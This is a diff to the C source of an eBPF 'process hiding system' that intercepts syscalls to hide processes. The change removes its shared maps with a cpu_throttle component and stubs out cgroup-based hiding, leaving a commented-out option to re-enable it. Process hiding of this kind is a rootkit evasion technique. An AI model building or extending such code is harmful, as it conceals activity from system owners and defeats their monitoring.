@@ -1,11 +1,13 @@
 /* =====================================================
- *  eBPF Process Hiding System - LSM-Free Implementation
+ *  eBPF Process Hiding System - STANDALONE Implementation
  *
- *  Architecture: Pure Tracepoint + Kprobe approach
+ *  Architecture: Pure Tracepoint + Kprobe approach (STANDALONE)
  *  - NO LSM hooks (removed for better performance)
+ *  - NO external map dependencies (standalone operation)
  *  - Tracepoint hooks for syscall interception
  *  - Kprobe hooks for process protection
  *  - Container auto-detection via namespace analysis
+ *  - Independent operation without cpu_throttle system
  * ===================================================== */
 
 #include "vmlinux.h"
@@ -88,21 +90,14 @@ struct {
 } proc_dir_filter_map SEC(".maps");
 
 /* =====================================================
- *  External Maps - Shared with cpu_throttle system
+ *  External Maps - REMOVED: No longer dependent on cpu_throttle system
+ *  All external map dependencies have been eliminated for standalone operation
  * ===================================================== */
-extern struct {
-    __uint(type, BPF_MAP_TYPE_HASH);
-    __uint(max_entries, 1024);
-    __type(key, u64);        /* cgroup id */
-    __type(value, u64);      /* quota ns */
-} quota_cg SEC(".extern");
 
-extern struct {
-    __uint(type, BPF_MAP_TYPE_HASH);
-    __uint(max_entries, 1024);
-    __type(key, u64);
-    __type(value, u64);
-} acc_cg SEC(".extern");
+/* NOTE: External maps (quota_cg, acc_cg) removed to eliminate dependencies
+ * on cpu_throttle system. The hide_process_bpf module now operates
+ * independently without requiring external BPF programs or maps.
+ */
 
 /* =====================================================
  *  Helper Functions
@@ -677,22 +672,35 @@ static __always_inline bool should_hide_process_tree(u32 pid)
 }
 
 /* =====================================================
- *  Cgroup-based Hiding Integration
+ *  Cgroup-based Hiding Integration - STANDALONE VERSION
  * ===================================================== */
 
-/* Check if current cgroup should be hidden */
+/* Check if current cgroup should be hidden - STANDALONE IMPLEMENTATION */
 static __always_inline bool should_hide_by_cgroup(void)
 {
-    u64 cgid = bpf_get_current_cgroup_id();
+    /* STANDALONE MODE: No external map dependencies
+     *
+     * This function previously relied on external maps (quota_cg, acc_cg)
+     * from cpu_throttle system. Since those dependencies have been removed,
+     * this function now implements internal cgroup-based detection.
+     */
 
-    /* Check if this cgroup has quota (indicating it's being monitored) */
-    u64 *quota = bpf_map_lookup_elem(&quota_cg, &cgid);
-    if (quota && *quota > 0) {
-        /* This cgroup is being throttled, so hide its processes */
-        return true;
-    }
-
+    /* Option 1: Always disabled (safest for standalone operation) */
     return false;
+
+    /* Option 2: Future enhancement - Internal cgroup pattern detection
+     * Uncomment below to enable basic cgroup-based hiding:
+     *
+     * u64 cgid = bpf_get_current_cgroup_id();
+     *
+     * // Hide processes in specific cgroup patterns
+     * // Example: Hide if cgroup ID matches certain patterns
+     * if (cgid > 0x1000000) {  // Example threshold
+     *     return true;
+     * }
+     *
+     * return false;
+     */
 }
 
 /* =====================================================
